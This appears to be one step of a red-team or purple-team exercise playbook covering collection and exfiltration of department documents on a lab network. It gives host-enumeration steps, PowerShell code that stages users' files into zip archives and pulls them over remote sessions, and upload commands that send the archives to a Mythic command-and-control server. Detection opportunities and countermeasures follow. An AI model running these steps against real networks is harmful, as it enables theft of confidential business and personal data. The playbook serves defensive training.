

# Step 5: Collect/Exfiltrate Sensitive Data

### Objective
Data reconnaissance, staging, and exfiltration of sensitive documents from HR, FIN, R&D, and ENG departments.

---

### Context
This machine has access to internal subnets (HR, FIN, ENG, RND)
HVTs have been identified and credentials acquired.
Each department stores proprietary files in `C:\Users\*\Documents\`, including `.docx`, `.xlsx`, and `.pdf` formats.

---

### Execution

1. **Enumerate Subnet Hosts**  
   Use PowerShell or custom tools (e.g., `Test-Connection`, `Get-ADComputer`, or raw socket scans) to enumerate reachable hosts in:
   - HR Subnet: `10.0.2.0/24`
   - FIN Subnet: `10.0.7.0/24`
   - ENG Subnet: `10.0.8.0/24`
   - RND Subnet: `10.0.5.0/24`

2. **File Enumeration**  
   - Connect to identified hosts via WMI/WinRM/SMB.
   - Search in `C:\Users\*\Documents\` for files ending in `.docx`, `.xlsx`, `.pdf`.

3. **Compression & Staging**  
      - Compress and stage files in `C:\Windows\Temp\`.
```powershell
$compress = @{
  Path = "C:\Users\*\Documents\*.docx", 
         "C:\Users\*\Documents\*.xlsx", 
         "C:\Users\*\Documents\*.pdf"
  CompressionLevel = "Fastest"
  DestinationPath = "C:\Windows\Temp\data.zip"
}
Compress-Archive @compress
```

4. **File Transfer**  
   - Copy zip files to the compromised IT machine using built-in PowerShell Remoting.
```powershell=
# Create a new PSSession to the remote computer
# Replace RemoteComputerName with hostname or IP
$session = New-PSSession -ComputerName "RemoteComputerName" -Credential (Get-Credential)

# Copy the file from remote to local
Copy-Item -Path "C:\Windows\Temp\data.zip" -Destination "C:\Windows\Temp\$session.ComputerName.zip" -FromSession $session

# Remove the PSSession
Remove-PSSession $session

```
   - For each subnet, group and compress the discovered documents into:
     - `hr.zip`, `fin.zip`, `rnd.zip`

5. **File Exfiletration**
   - Upload files to Mythic
       - `upload C:\Windows\Temp\hr.zip`
       - `upload C:\Windows\Temp\fin.zip`
       - `upload C:\Windows\Temp\rnd.zip`

---

### Result
Three zip archives containing sensitive documents from HR, FIN, and RND networks are successfully staged on the IT workstation, ready for exfiltration. ENG network yielded no accessible machines.

---

### Detection Opportunities
- Host enumeration or scan activity originating from the IT workstation.
- SMB access from the IT workstation to departmental hosts.
- Unusual file access on `C:\Users\*\Documents\` directories across multiple machines.
- Use of PowerShell or archiving tools (`Compress-Archive`, `7zip`, etc.) on sensitive files.
- Creation of `.zip` files in `C:\Windows\Temp\`.
- Data movement from department hosts to IT workstation over SMB.
- Anomalous use of WMI/WinRM/PowerShell Remoting.

---

### Defensive Countermeasures
- Enable and monitor file auditing (Object Access) for `Documents\` folders.
- Alert on creation or movement of `.zip` files in sensitive directories or temp locations.
- Segment and restrict access between IT and department subnets using firewall ACLs.
- Monitor and alert on lateral movement tools and protocols (e.g., PowerShell Remoting, WMI).
- Deploy DLP (Data Loss Prevention) policies for bulk file access or archive creation.
- Monitor inter-subnet communication patterns and baseline deviations.

---
